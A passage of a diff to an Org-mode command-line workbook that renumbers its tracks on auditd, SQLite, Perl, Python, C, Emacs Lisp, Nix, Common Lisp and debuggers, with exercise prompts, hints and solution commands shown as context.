 Log every program execution with a syscall rule. Run a few commands, then list
 exactly which ones ran with their full command lines, and get a summary of the
 most-run executables.
@@ -3081,7 +4189,7 @@ aureport -x --summary -i --start recent 2>/dev/null | head -8
 Execution logging is noisy; real systems restrict it with more =-F= filters
 (one user, one directory, only root).
 
-** TODO E15.5 — Catch denied access
+** TODO E16.5 — Catch denied access
 Record every file open that fails with "Permission denied", whoever tries it.
 Let bob poke around =/srv/lab/perms=, then report the denials by user and file.
 You'll meet: =-S openat -F exit=-EACCES=, =-F auid>=1000=, =aureport -f
@@ -3103,7 +4211,7 @@ ausearch -k denied --success no -i --start recent 2>/dev/null | grep -oE 'type=P
 aureport -f --failed -i --start recent 2>/dev/null | tail -4
 #+end_src
 
-** TODO E15.6 — Clean up and make rules permanent
+** TODO E16.6 — Clean up and make rules permanent
 List the rules you added, remove one, then remove them all. Write your
 favourite rules to a file and load it in one go, the way a server does at boot.
 Why should you think twice about =-e 2=?
@@ -3131,7 +4239,7 @@ auditctl -R /etc/audit/rules.d/lab.rules
 auditctl -l
 #+end_src
 
-* 16. SQLite
+* 17. SQLite
 :PROPERTIES:
 :VISIBILITY: children
 :END:
@@ -3143,7 +4251,7 @@ database, query it, join it, index it, and drive it from the shell, Python and
 Org. SQL blocks here run through Babel with =sqlite= blocks; the database lives
 at =/root/workbook-data/sql/lab.db=.
 
-** TODO E16.1 — Import a CSV
+** TODO E17.1 — Import a CSV
 Create =lab.db=, import =employees.csv= and =depts.csv= as tables, look at the
 schema SQLite inferred, and count the rows.
 You'll meet: =sqlite3 FILE=, dot-commands (=.import --csv=, =.tables=,
@@ -3173,7 +4281,7 @@ SQL
 Creating =employees= first makes =salary= a real integer, so sorting and
 averaging behave. =depts= was created from the header, so every column is text.
 
-** TODO E16.2 — SELECT, WHERE, ORDER BY
+** TODO E17.2 — SELECT, WHERE, ORDER BY
 Find the ten best-paid employees; everyone hired in 2024; everyone whose last
 name starts with "T"; and the number of distinct first names. Show results as
 an aligned table.
@@ -3198,7 +4306,7 @@ SELECT count(*) AS hired_2024,
 FROM employees WHERE hired BETWEEN '2024-01-01' AND '2024-12-31';
 #+end_src
 
-** TODO E16.3 — GROUP BY: the salary question, one more time
+** TODO E17.3 — GROUP BY: the salary question, one more time
 Average, minimum and maximum salary per department, highest average first, to
 two decimals. Then only departments with more than 170 people. Compare with
 awk (E8.3), Python and Lisp.
@@ -3221,7 +4329,7 @@ FROM employees GROUP BY dept ORDER BY avg_salary DESC;
 SELECT dept, count(*) AS people FROM employees GROUP BY dept HAVING count(*) > 170;
 #+end_src
 
-** TODO E16.4 — JOIN
+** TODO E17.4 — JOIN
 List each department with its manager, floor and head count. Then find every
 employee on floor 1, and any department in =employees= with no row in =depts=.
 You'll meet: =JOIN … ON=, =LEFT JOIN=, table aliases, =IS NULL=.
@@ -3247,7 +4355,7 @@ SELECT DISTINCT e.dept AS no_dept_row FROM employees e LEFT JOIN depts d ON e.de
 The second query returns nothing: every department has a row. Try deleting
 one (=DELETE FROM depts WHERE dept='ops';=) and run it again.
 
-** TODO E16.5 — Logs into SQL
+** TODO E17.5 — Logs into SQL
 Load =access.log= into a table with columns for IP, day, hour, method, path,
 status and bytes. Then find: the top 5 IPs by bytes, status counts, requests per
 hour of the day, and the error rate per path.
@@ -3272,7 +4380,7 @@ sqlite3 -box lab.db 'SELECT path, count(*) AS hits, round(100.0 * sum(status >= 
 One path fails on every request. In a real log that's the first thing you'd
 investigate; here it's how the synthetic log was generated.
 
-** TODO E16.6 — Indexes and query plans
+** TODO E17.6 — Indexes and query plans
 Time a query that looks up employees by last name, look at its query plan, add
 an index, and compare both.
 You'll meet: =.timer on=, =EXPLAIN QUERY PLAN=, =SCAN= vs =SEARCH … USING
@@ -3292,7 +4400,7 @@ sqlite3 lab.db "DROP INDEX IF EXISTS idx_last; EXPLAIN QUERY PLAN SELECT * FROM 
 sqlite3 lab.db "CREATE INDEX idx_last ON employees(last); EXPLAIN QUERY PLAN SELECT * FROM employees WHERE last = 'Turing';"
 #+end_src
 
-** TODO E16.7 — JSON inside SQLite
+** TODO E17.7 — JSON inside SQLite
 Without jq or Python, count =tickets.json= by status and find the assignee with
 the most open tickets, reading the JSON file directly from SQL.
 You'll meet: =readfile()=, =json_each()=, =json_extract()= / =->>=,
@@ -3315,7 +4423,7 @@ sqlite3 :memory: "SELECT value ->> '\$.assignee', count(*) AS n
   WHERE value ->> '\$.status' = 'open' GROUP BY 1 ORDER BY n DESC LIMIT 1;"
 #+end_src
 
-** TODO E16.8 — SQLite from the shell and from Python
+** TODO E17.8 — SQLite from the shell and from Python
 Use a query's output directly in a pipeline as CSV. Then run the per-department
 query from Python with parameters, never by pasting values into the SQL string.
 You'll meet: =sqlite3 -csv= / =-json=, =sqlite3 DB 'SQL'= one-shots,
@@ -3344,7 +4452,7 @@ PY
 The second "department" is an injection attempt; with a placeholder it's just a
 string that matches nothing, and the table survives.
 
-* 17. perl
+* 18. perl
 :PROPERTIES:
 :VISIBILITY: children
 :END:
@@ -3354,7 +4462,7 @@ with back-references, real hashes, and slurp/multi-line matching. You'll
 discover the =-n -p -a -F -l -i= one-liner flags first, then graduate to a
 script with a nested data structure.
 
-** TODO E17.1 — grep, reimplemented in Perl
+** TODO E18.1 — grep, reimplemented in Perl
 Print lines of =sherlock.txt= matching /Holmes/, using =perl= not =grep=.
 You'll meet: =-n=, =-e=, the implicit =$_=.
 *** Scratch
@@ -3369,7 +4477,7 @@ You'll meet: =-n=, =-e=, the implicit =$_=.
 perl -ne 'print if /Holmes/' sherlock.txt
 #+end_src
 
-** TODO E17.2 — sed, reimplemented in Perl
+** TODO E18.2 — sed, reimplemented in Perl
 Substitute Holmes→Poirot across the file.
 You'll meet: =-p= (print each line automatically), and =-i= for in-place.
 *** Scratch
@@ -3384,7 +4492,7 @@ edits the stream.
 perl -pe 's/Holmes/Poirot/g' sherlock.txt
 #+end_src
 
-** TODO E17.3 — awk, reimplemented: sum the salary column
+** TODO E18.3 — awk, reimplemented: sum the salary column
 You'll meet: autosplit =-a=, custom split =-F=, =@F=, =-l=, the line number =$.=.
 *** Scratch
 #+begin_src bash
@@ -3398,7 +4506,7 @@ skip the header with =$. > 1=; sum and print in an =END{}=.
 perl -F, -lane '$s += $F[4] if $. > 1; END { print $s }' employees.csv
 #+end_src
 
-** TODO E17.4 — Word frequency with a hash
+** TODO E18.4 — Word frequency with a hash
 Top 10 words of a book.
 You'll meet: hashes =%c=, a global match =//g= in list context, =lc=, sorting keys.
 *** Scratch
@@ -3415,7 +4523,7 @@ perl -lne 'for (/([A-Za-z]+)/g){ $c{lc $1}++ }
                 print "$c{$_}\t$_" for @k[0..9] }' moby-dick.txt
 #+end_src
 
-** TODO E17.5 — Parse the access log with named captures
+** TODO E18.5 — Parse the access log with named captures
 Print "IP CODE BYTES" for each request using one regex with *named* groups.
 You'll meet: =(?<name>...)= and the =%+= hash.
 *** Scratch
@@ -3430,7 +4538,7 @@ perl -ne 'print "$+{ip} $+{code} $+{bytes}\n"
           if /^(?<ip>\S+).*" (?<code>\d{3}) (?<bytes>\d+)/' access.log | head
 #+end_src
 
-** TODO E17.6 — Collapse accidental doubled words
+** TODO E18.6 — Collapse accidental doubled words
 Turn "the the game is is afoot" into "the game is afoot".
 You'll meet: back-references *inside a substitution*, word boundaries.
 *** Scratch
@@ -3444,7 +4552,7 @@ You'll meet: back-references *inside a substitution*, word boundaries.
 echo 'the the game is is is afoot' | perl -pe 's/\b(\w+)(\s+\1\b)+/$1/g'
 #+end_src
 
-** TODO E17.7 — A real script: per-department roster
+** TODO E18.7 — A real script: per-department roster
 Read =employees.csv=, build a hash-of-arrays (dept → list of "First Last"), and
 print each department with its members, sorted.
 You'll meet: references, =push @{ $h{$k} }=, nested iteration — Perl's data structures.
@@ -3473,7 +4581,7 @@ for my $dept (sort keys %roster) {
 #+end_src
 Run with =C-c C-c=, or tangle and =perl /root/workbook-data/roster.pl=.
 
-** TODO E17.8 — Multi-line matching (slurp mode)
+** TODO E18.8 — Multi-line matching (slurp mode)
 Find sentences that span two lines in a book (a lowercase word, newline, more
 words, then a period).
 You'll meet: =-0777= slurp, and the =/s= =/m= regex modifiers.
@@ -3490,7 +4598,7 @@ perl -0777 -ne 'while (/([a-z]+\s*\n[^.\n]{0,60}\.)/g){ ($x=$1)=~s/\s+/ /g; prin
   sherlock.txt | head
 #+end_src
 
-* 18. python
+* 19. python
 :PROPERTIES:
 :VISIBILITY: children
 :END:
@@ -3499,7 +4607,7 @@ When data is structured (JSON), or the logic outgrows a one-liner, Python is
 the reach. You'll discover the batteries — =json=, =csv=, =re=, =collections=,
 =pathlib=, =argparse=, =dataclasses= — and the shape of a real, testable module.
 
-** TODO E18.1 — Count tickets by status
+** TODO E19.1 — Count tickets by status
 Load =tickets.json= properly and tally the statuses.
 You'll meet: =json.load=, =collections.Counter=.
 *** Scratch
@@ -3515,7 +4623,7 @@ data = json.load(open('/root/corpus/tickets.json'))
 print(collections.Counter(t['status'] for t in data))
 #+end_src
 
-** TODO E18.2 — Average salary per department, the Python way
+** TODO E19.2 — Average salary per department, the Python way
 You'll meet: =csv.DictReader=, =collections.defaultdict=.
 *** Scratch
 #+begin_src python :results output
@@ -3536,7 +4644,7 @@ for dept in sorted(by):
 #+end_src
 Same answer as awk E8.3 — three tools, one truth. Diff them.
 
-** TODO E18.3 — Top talkers from the log, with regex
+** TODO E19.3 — Top talkers from the log, with regex
 Parse =access.log= with the =re= module; sum bytes per IP; print the top 5.
 You'll meet: =re.compile=, named groups =(?P<name>...)=, =Counter.most_common=.
 *** Scratch
@@ -3558,7 +4666,7 @@ for ip, b in tot.most_common(5):
     print(f"{b:>8} {ip}")
 #+end_src
 
-** TODO E18.4 — A CLI search tool
+** TODO E19.4 — A CLI search tool
 =argparse=-driven: search the corpus for a pattern, optional =--ignore-case=.
 You'll meet: =argparse=, =pathlib=, exit codes.
 *** Scratch
@@ -3590,7 +4698,7 @@ if __name__ == "__main__":
 #+end_src
 Tangle, then: =python3 /root/workbook-data/search.py -i holmes=.
 
-** TODO E18.5 — Stream a big file with a generator
+** TODO E19.5 — Stream a big file with a generator
 Yield only the matching lines of =access.log= without loading it all; count 404s.
 You'll meet: generator functions =yield=, lazy iteration.
 *** Scratch
@@ -3611,7 +4719,7 @@ n = sum(1 for _ in matches('/root/corpus/access.log', '" 404 '))
 print("404s:", n)
 #+end_src
 
-** TODO E18.6 — Model a ticket with a dataclass
+** TODO E19.6 — Model a ticket with a dataclass
 Load tickets into =Ticket= objects, print the 5 highest-priority open ones.
 You'll meet: =@dataclass=, =sorted(key=...)=, comprehensions.
 *** Scratch
@@ -3634,7 +4742,7 @@ top = sorted((t for t in tix if t.status == 'open'),
 for t in top: print(t)
 #+end_src
 
-** TODO E18.7 — A testable module
+** TODO E19.7 — A testable module
 Turn "word frequency" into =wordfreq.py= with a function and a =unittest=, run
 the test.
 You'll meet: =if __name__ == "__main__"=, =unittest=, module structure.
@@ -3659,7 +4767,7 @@ if __name__ == "__main__":
 #+end_src
 Tangle, then =python3 /root/workbook-data/wordfreq.py=.
 
-* 19. C
+* 20. C
 :PROPERTIES:
 :VISIBILITY: children
 :END:
@@ -3669,7 +4777,7 @@ Down to the metal. You'll discover that the compiler is a teacher (=-Wall
 ASan), and that structs + function pointers + =qsort= are how C does what awk
 did in one line. The broken programs from *Setup* live in =/root/workbook-data/c=.
 
-** TODO E19.1 — Hello, warnings
+** TODO E20.1 — Hello, warnings
 Compile a hello program with =-Wall -Wextra=, then introduce an unused variable
 and a format-mismatch and read what the compiler says.
 You'll meet: warning flags as a feedback loop.
@@ -3695,7 +4803,7 @@ C
 gcc -Wall -Wextra hello.c -o hello && ./hello
 #+end_src
 
-** TODO E19.2 — Reimplement =wc -l=
+** TODO E20.2 — Reimplement =wc -l=
 Read a file and count newlines. Match coreutils exactly.
 You'll meet: =FILE*=, =fopen=, =fgetc=, =argv=.
 *** Scratch
@@ -3725,7 +4833,7 @@ gcc -Wall -Wextra wcl.c -o wcl
 echo "coreutils: $(wc -l < /root/corpus/employees.csv)"
 #+end_src
 
-** TODO E19.3 — Catch a heap bug with valgrind
+** TODO E20.3 — Catch a heap bug with valgrind
 Compile =leaky.c= (from Setup), run it under valgrind, read the report, fix both
 problems.
 You'll meet: valgrind's "Invalid write" and "definitely lost".
@@ -3758,7 +4866,7 @@ gcc -g -Wall leaky_fixed.c -o leaky_fixed
 valgrind --leak-check=full --error-exitcode=1 ./leaky_fixed 2>&1 | grep -E 'ERROR SUMMARY'
 #+end_src
 
-** TODO E19.4 — Catch a stack bug with the sanitizer
+** TODO E20.4 — Catch a stack bug with the sanitizer
 =offbyone.c= writes one past an array. valgrind often misses stack bugs — use
 AddressSanitizer instead.
 You'll meet: =-fsanitize=address=, and when to prefer it over valgrind.
@@ -3778,7 +4886,7 @@ sed 's/i <= 5/i < 5/' offbyone.c > offbyone_fixed.c
 gcc -g -fsanitize=address offbyone_fixed.c -o offbyone_fixed && ./offbyone_fixed
 #+end_src
 
-** TODO E19.5 — Sort employees by salary with =qsort=
+** TODO E20.5 — Sort employees by salary with =qsort=
 Parse =employees.csv= into an array of structs and sort descending by salary.
 You'll meet: =struct=, =qsort=, a comparator function pointer.
 *** Scratch
@@ -3822,7 +4930,7 @@ gcc -g -Wall -Wextra sortemp.c -o sortemp && ./sortemp
 #+end_src
 awk did this in E3.x with one line — now you know what it does underneath.
 
-** TODO E19.6 — A Makefile, then a CMakeLists
+** TODO E20.6 — A Makefile, then a CMakeLists
 Turn your growing =c/= directory into a =make=-built project, then do the same
 with cmake and an out-of-source build.
 You'll meet: =make= targets & implicit rules; =cmake= configure/build.
@@ -3855,10 +4963,10 @@ CM
 cmake -S . -B build >/dev/null && cmake --build build >/dev/null && echo "cmake built into build/"
 #+end_src
 
-** TODO E19.7 — Give your editor real understanding (bear + clangd)
+** TODO E20.7 — Give your editor real understanding (bear + clangd)
 Generate =compile_commands.json= so =clangd= (hence Emacs/nvim LSP) knows how
 each file is compiled.
-You'll meet: =bear=, =compile_commands.json= — the bridge to track 20.
+You'll meet: =bear=, =compile_commands.json= — the bridge to track 21.
 *** Scratch
 #+begin_src bash :dir /root/workbook-data/c :results output
 
@@ -3876,7 +4984,7 @@ head -c 300 compile_commands.json; echo
 Now open =sortemp.c= in Emacs (=M-x eglot=) and hover a symbol — that works
 because of this file.
 
-* 20. Emacs & Elisp
+* 21. Emacs & Elisp
 :PROPERTIES:
 :VISIBILITY: children
 :END:
@@ -3888,7 +4996,7 @@ commands — culminating in re-solving track 8's word-frequency in Lisp.
 
 Do these interactively in Emacs, not as shell blocks.
 
-** TODO E20.1 — You already ran code: prove it
+** TODO E21.1 — You already ran code: prove it
 Re-run any =bash= block above with =C-c C-c= and watch =#+RESULTS:= appear.
 Then =C-c C-v t= to /tangle/ every =:tangle= block to disk at once.
 You'll meet: Org Babel evaluation, =#+RESULTS:=, tangling.
@@ -3900,7 +5008,7 @@ files that appear.
 No code — this is muscle memory. Blocks run in the directory given by =:dir=
 (for bash, the file-wide default is =/root/corpus=, set at the top of this file).
 
-** TODO E20.2 — Reformat a column with a keyboard macro
+** TODO E21.2 — Reformat a column with a keyboard macro
 In =employees.csv= (open it with =SPC . /root/corpus/employees.csv=),
 record a macro that turns the first data line's =id,first,last= into
 =last, first (#id)=, then apply it to the next 20 lines.
@@ -3914,7 +5022,7 @@ Macros are a discovery exercise; there is no single "answer". The insight: a
 macro is a recorded edit you replay — a script made of keystrokes, useful
 exactly when writing awk would be overkill.
 
-** TODO E20.3 — Emacs regex is NOT PCRE
+** TODO E21.3 — Emacs regex is NOT PCRE
 Use =M-x query-replace-regexp= (=C-M-%=) on a book buffer to swap first/last of
 "Holmes, Sherlock" style names. Notice the parenthesis escaping.
 You'll meet: Emacs regex syntax — literal =(= matches a paren; =\(...\)= groups.
@@ -3927,7 +5035,7 @@ The lesson is the friction itself: after a week of =grep -E=/=perl=, Emacs's
 =\(...\)= feels backwards. Keep =SPC h f re-search-forward= and =M-x
 regexp-builder= (=re-builder=) handy.
 
-** TODO E20.4 — =occur= vs grep
+** TODO E21.4 — =occur= vs grep
 With a book open, =M-x occur= for =Holmes=. Then =M-x rgrep= across the corpus.
 Compare navigating hits in-buffer vs across files.
 You'll meet: =occur=, =grep-mode= buffers, =next-error= (=M-g n=).
@@ -3939,7 +5047,7 @@ Interactive. Takeaway: =occur= is grep for the buffer you're in; =grep-mode=
 turns file-wide search results into a navigable list — the editor-native version
 of track 6.
 
-** TODO E20.5 — Evaluate Lisp in place
+** TODO E21.5 — Evaluate Lisp in place
 In =*scratch*= (or here), type =(+ 1 2)= and =C-x C-e=. Then evaluate
 =(shell-command-to-string "awk 'END{print NR}' /root/corpus/access.log")=.
 You'll meet: =C-x C-e=, the =*Messages*= echo, calling the shell from Lisp.
@@ -3957,7 +5065,7 @@ output as a string — Lisp gluing to the tools you already know.
 #+end_src
 
 
-** TODO E20.6 — Write your first interactive command
+** TODO E21.6 — Write your first interactive command
 Define =count-words-region= that reports the word count of the selected region
 in the echo area, and bind it to =C-c w=.
 You'll meet: =defun=, =(interactive "r")=, =message=, =global-set-key=.
@@ -3978,7 +5086,7 @@ You'll meet: =defun=, =(interactive "r")=, =message=, =global-set-key=.
 #+end_src
 Evaluate the block (=C-c C-c=), select some text, press =C-c w=.
 
-** TODO E20.7 — Word frequency, in Elisp (capstone of the language tracks)
+** TODO E21.7 — Word frequency, in Elisp (capstone of the language tracks)
 Write =corpus-word-freq= that reads a corpus file into a temp buffer, tallies
 words in a hash table, and shows the top 15 in a new buffer. You've now done
 this in grep+sort, awk, perl, and python — do it in Lisp.
@@ -4020,7 +5128,7 @@ Five implementations, one algorithm. That comparison — pipeline vs field-tool
 vs scripting-language vs systems-language vs editor-extension — is the real
 lesson of the whole workbook.
 
-* 21. Nix
+* 22. Nix
 :PROPERTIES:
 :VISIBILITY: children
 :END:
@@ -4032,7 +5140,7 @@ into a first-class system command.
 
 Work against your real flake in =~/nixlab= (or =/etc/nixos= on the box).
 
-** TODO E21.1 — Add a tool the declarative way
+** TODO E22.1 — Add a tool the declarative way
 Add =hyperfine= (a benchmarking tool) to =toolchain.nix=, rebuild, and use it to
 race =grep= vs =awk= on the 404 count.
 You'll meet: the one true install path on NixOS — edit config, rebuild.
@@ -4051,7 +5159,7 @@ hyperfine "grep -cE '\" 404 ' /root/corpus/access.log" \
   || echo "add hyperfine to toolchain.nix and ./lab-ctl.sh rebuild first"
 #+end_src
 
-** TODO E21.2 — Explore packages in the repl
+** TODO E22.2 — Explore packages in the repl
 Open =nix repl=, load nixpkgs, and inspect a package: its version, its store
 path.
 You'll meet: =nix repl=, attribute sets, =:p=.
@@ -4068,7 +5176,7 @@ echo ':p builtins.attrNames { a = 1; b = 2; }' | nix repl 2>/dev/null | tail -3 
   || echo "run interactively: nix repl nixpkgs  then  pkgs.hello.version"
 #+end_src
 
-** TODO E21.3 — Which package provides a binary?
+** TODO E22.3 — Which package provides a binary?
 You want =pstree= but don't know its package. Find it.
 You'll meet: =nix search=, and package-vs-binary name mismatches.
 *** Scratch
@@ -4083,7 +5191,7 @@ differ (=pstree= lives in =psmisc=).
 nix search nixpkgs pstree 2>/dev/null | head || echo "nix search nixpkgs pstree"
 #+end_src
 
-** TODO E21.4 — Time-travel with generations
+** TODO E22.4 — Time-travel with generations
 Make a trivial config change, rebuild, then roll back — and see both generations
 listed.
 You'll meet: system generations, =--rollback=, the profiles directory.
@@ -4101,7 +5209,7 @@ nix-env --list-generations -p /nix/var/nix/profiles/system 2>/dev/null | tail -5
   || echo "run on the box as root"
 #+end_src
 
-** TODO E21.5 — Turn a script into a system command
+** TODO E22.5 — Turn a script into a system command
 Package your =search.sh= (from track 9) as a proper =corpus-search= binary using
 =writeShellScriptBin=, and add it to =systemPackages=.
 You'll meet: trivial builders — Nix wrapping a script into the PATH.
@@ -4126,7 +5234,7 @@ environment.systemPackages = with pkgs; [
 Referencing =${gnugrep}= instead of bare =grep= is the Nix habit: the script
 carries its own dependency, so it can't break when PATH changes.
 
-** TODO E21.6 — Introspect your own flake
+** TODO E22.6 — Introspect your own flake
 From =~/nixlab=, show what your flake actually provides and how it's pinned.
 You'll meet: =nix flake show=, =nix flake metadata=, =flake.lock=.
 *** Scratch
@@ -4142,7 +5250,7 @@ cd /etc/nixos 2>/dev/null && nix flake show 2>/dev/null | head -20 \
   || echo "cd to your flake dir and: nix flake show"
 #+end_src
 
-* 22. Common Lisp
+* 23. Common Lisp
 :PROPERTIES:
 :VISIBILITY: children
 :END:
@@ -4152,14 +5260,14 @@ program runs /while you write it/: every block below is evaluated in one SBCL
 image that SLIME keeps running, so a function defined in one exercise is still
 there in the next. You'll meet exact arithmetic, hash tables, structs, macros
 that write code, and a condition system that lets you fix an error without
-unwinding the stack — and you'll re-solve problems from tracks 8 and 18 to feel
+unwinding the stack — and you'll re-solve problems from tracks 8 and 19 to feel
 the difference.
 
 Run blocks with =SPC c c=. The first one starts SBCL (a few seconds). Keep
 [[file:/root/workbook-data/practice/hello.lisp][hello.lisp]] and E0.14–E0.15 in mind: =SPC c e= opens any block in a
 real Lisp buffer where =SPC l= and =SPC k= work.
 
-** TODO E22.1 — Numbers that don't lie
+** TODO E23.1 — Numbers that don't lie
 Compute =1/3 * 3=, =2^100=, and =22/7= as a decimal. Compare with what Python or
 awk give you.
 You'll meet: prefix notation, ratios, bignums, =float=.
@@ -4182,7 +5290,7 @@ Everything is =(function args...)=. Division of integers gives an exact
 =(* 1/3 3)= is exactly =1=, not =0.9999999=. Lisp only loses precision when you
 ask it to.
 
-** TODO E22.2 — Count the lines of access.log
+** TODO E23.2 — Count the lines of access.log
 Open the file, read it line by line, count. No shelling out.
 You'll meet: =with-open-file=, =read-line=, =loop=.
 *** Scratch
@@ -4201,7 +5309,7 @@ exactly this: =for line = ... while line count t=.
         count t))
 #+end_src
 
-** TODO E22.3 — Split a CSV line
+** TODO E23.3 — Split a CSV line
 Standard Common Lisp has no string-split. Write =split-on= so that
 =(split-on #\, "a,b,c")= returns =("a" "b" "c")=. Test it on the CSV header.
 You'll meet: =defun=, =position=, =subseq=, characters (=#\,=).
@@ -4226,7 +5334,7 @@ no more — and =(subseq s start nil)= means "to the end".
 =split-on= now lives in the running image. The next exercises use it without
 redefining it.
 
-** TODO E22.4 — Average salary per department (track 8, again)
+** TODO E23.4 — Average salary per department (track 8, again)
 Same question as E8.3, in Lisp. Print each department with its average to two
 decimals.
 You'll meet: hash tables, =gethash= / =incf=, =parse-integer=, =maphash=,
@@ -4260,7 +5368,7 @@ Compare with awk's output: a couple of averages differ in the last digit. The
 division here is an exact ratio rounded once; awk rounds a binary float. Lisp is
 the one that's right.
 
-** TODO E22.5 — Tally HTTP status codes (track 8, again)
+** TODO E23.5 — Tally HTTP status codes (track 8, again)
 Count each status code in access.log and print them most-frequent first.
 You'll meet: =search=, =parse-integer :junk-allowed=, alists, =sort :key=.
 *** Scratch
@@ -4290,7 +5398,7 @@ line. =(search "\" " line :from-end t)= finds it; =parse-integer= with
 #+end_src
 Check it against =awk '{print $9}' access.log | sort | uniq -c | sort -rn=.
 
-** TODO E22.6 — Word frequency, in Lisp
+** TODO E23.6 — Word frequency, in Lisp
 The top 10 words in sherlock.txt, lowercase, letters only — the same problem
 you solved in grep, awk, perl, python and elisp.
 You'll meet: reading a whole file, =alpha-char-p=, string output streams,
@@ -4332,7 +5440,7 @@ word (a =make-string-output-stream=), anything else ends the word. Count in an
         do (format t "~7d ~a~%" n w)))
 #+end_src
 
-** TODO E22.7 — Structs: the five best-paid employees
+** TODO E23.7 — Structs: the five best-paid employees
 Load employees.csv into a list of =employee= structs and print the top five by
 salary, with thousands separators.
 You'll meet: =defstruct=, =destructuring-bind=, =defparameter=, =sort=,
@@ -4369,7 +5477,7 @@ You'll meet: =defstruct=, =destructuring-bind=, =defparameter=, =sort=,
 Now press =SPC l i= and enter =(first *employees*)=: the inspector lets you
 poke around a live object (=RET= on a slot dives in, =l= goes back, =q= quits).
 
-** TODO E22.8 — A macro that writes code for you
+** TODO E23.8 — A macro that writes code for you
 Write =with-timing= so that =(with-timing body...)= runs the body, prints how
 long it took, and still returns the body's value. Then look at what it expands
 into.
@@ -4405,7 +5513,7 @@ first, use second — the same reason =defmacro= goes near the top of a file.
 Interactive version: =SPC c e= to open this block in a Lisp buffer, put the
 cursor on =(with-timing ...)=, and press =SPC l m=.
 
-** TODO E22.9 — Conditions and restarts
+** TODO E23.9 — Conditions and restarts
 Make a salary parser that survives bad input two ways: by catching the error,
 and by offering /restarts/ that the caller (or you, in the debugger) chooses.
 You'll meet: =handler-case=, =restart-case=, =handler-bind=,
@@ -4447,7 +5555,7 @@ handler. The debugger lists =USE-ZERO= and =USE-VALUE=: pick =USE-VALUE=, type
 =200=, and the =mapcar= /continues/ as if nothing happened — =(100 200 300)=.
 Few languages can do that.
 
-** TODO E22.10 — From REPL to program
+** TODO E23.10 — From REPL to program
 Turn a Lisp function into (a) a script you run with =./=, and (b) a
 standalone executable that needs no SBCL installed.
 You'll meet: =sbcl --script=, =sb-ext:*posix-argv*=, =save-lisp-and-die=.
@@ -4483,7 +5591,7 @@ ls -lh count-lines | awk '{print $5, $9}'
 The binary is large because it carries the whole Lisp with it — compiler and
 all.
 
-* 23. Debuggers
+* 24. Debuggers
 :PROPERTIES:
 :VISIBILITY: children
 :END:
@@ -4506,7 +5614,7 @@ to find the bug with the debugger, not by reading the source — resist peeking.
 Solution blocks run the debugger non-interactively so you can compare notes;
 the real exercise is typing those commands yourself.
 
-** TODO E23.1 — gdb: break, run, look
+** TODO E24.1 — gdb: break, run, look
 =debug/c/avg.c= averages five scores and prints something absurd. Compile it
 for debugging, stop inside =sum=, and find out where the absurd number comes
 from.
@@ -4531,8 +5639,8 @@ gdb -q -batch -ex 'break sum' -ex run -ex 'info args' -ex 'print *xs@n' \
 The array holds exactly the five scores, yet the loop runs while =i <= n=, so
 it also adds =xs[5]= — whatever garbage sits past the end. Fix: =i < n=.
 
-** TODO E23.2 — gdb: watchpoints, conditions, and return values
-Fix the loop from E23.1 and run again: the answer is now /close/ but still
+** TODO E24.2 — gdb: watchpoints, conditions, and return values
+Fix the loop from E24.1 and run again: the answer is now /close/ but still
 wrong. Use gdb to prove where the precision disappears, without adding a
 single =printf=.
 You'll meet: =watch=, =break FILE:LINE if COND=, =finish=, =display=,
@@ -4556,7 +5664,7 @@ gdb -q -batch -ex 'break 6 if i == 4' -ex run -ex 'print i' -ex 'print total' \
 83.2. Fix: =return (double)sum(xs, n) / n;=. The debugger showed the right
 value leaving =sum=, which pins the bug to the one line after it.
 
-** TODO E23.3 — gdb: a crash and its backtrace
+** TODO E24.3 — gdb: a crash and its backtrace
 =debug/c/crash.c= segfaults. Find which employee crashes it and why, using
 only the debugger.
 You'll meet: running until a signal, =bt= (backtrace), =frame N=, =up= /
@@ -4583,7 +5691,7 @@ succeed first: into a pipe, =printf= output is buffered and dies with the
 crash. Run =./crash= in a terminal and you'll see them — a classic trap when
 "debugging with printf".
 
-** TODO E23.4 — The same session, inside your editor
+** TODO E24.4 — The same session, inside your editor
 Debug =avg.c= again, but from Neovim and then from Emacs: set a breakpoint by
 pointing at a line, step with keys, and read variables without typing =print=.
 You'll meet: nvim-dap (=<leader>d…=), Emacs GUD (=M-x gdb=,
@@ -4605,7 +5713,7 @@ No code — this is muscle memory. The takeaway: an editor front-end speaks the
 same debugger underneath (gdb, via the Debug Adapter Protocol in Neovim and via
 gdb's machine interface in Emacs); it just saves you from typing =print=.
 
-** TODO E23.5 — pdb: step into the call that goes wrong
+** TODO E24.5 — pdb: step into the call that goes wrong
 =debug/py/tally.py= counts ticket statuses in two halves and reports 400
 tickets out of 200. Find the bug by stopping on the /second/ call to =tally=.
 You'll meet: =python3 -m pdb=, =b LINE=, =c=, =s= vs =n=, =p=, =w=,
@@ -4627,7 +5735,7 @@ The default ={}= is created /once/, when =def= runs, and every call that omits
 =counts= shares it. Fix: =counts=None=, then =counts = {} if counts is None
 else counts=.
 
-** TODO E23.6 — pdb: post-mortem debugging
+** TODO E24.6 — pdb: post-mortem debugging
 =debug/py/report.py= dies with a =KeyError=. Instead of re-running with
 prints, let it crash /inside/ the debugger and inspect the wreckage.
 You'll meet: =python3 -m pdb -c continue=, post-mortem mode, =w=, =u= / =d=,
@@ -4649,19 +5757,19 @@ names, e.g. =if name not in depts: print(f"{name:10} (no data)"); continue=.
 In your own scripts, =python3 -m pdb -c continue script.py= is the fastest way
 to see a crash from the inside.
 
-** TODO E23.7 — Python debugging in the editor
-Repeat E23.5 from Neovim and from Emacs.
+** TODO E24.7 — Python debugging in the editor
+Repeat E24.5 from Neovim and from Emacs.
 You'll meet: nvim-dap-python, Emacs =M-x pdb=.
 *** Hint
 Neovim: in =tally.py=, =<leader>db= on line 18, =<leader>dc=, choose =file=.
 When it stops, =<leader>di= steps into =tally=; hover =counts= and
 =<leader>de=. Emacs: =SPC SPC pdb=, accept =python -m pdb tally.py=, and use
-the same pdb commands as E23.5 — the source follows in the other window.
+the same pdb commands as E24.5 — the source follows in the other window.
 *** Solution
 No code. nvim-dap talks to =debugpy= (installed in the lab), Emacs talks to
 plain pdb; the stops, steps and values are identical.
 
-** TODO E23.8 — Delve: debugging Go
+** TODO E24.8 — Delve: debugging Go
 =debug/go= prints the /least/ common words in sherlock.txt instead of the most
 common. Stop at the end of =topN= and prove which way the slice is sorted.
 You'll meet: =dlv debug=, =break FUNC= / =break FILE:LINE=, =continue=,
@@ -4684,7 +5792,7 @@ dlv debug --init /tmp/dlv-topn --allow-non-terminal-interactive=true 2>&1 \
 =out[0]= has the smallest count: the =sort.Slice= comparator uses =<=, which
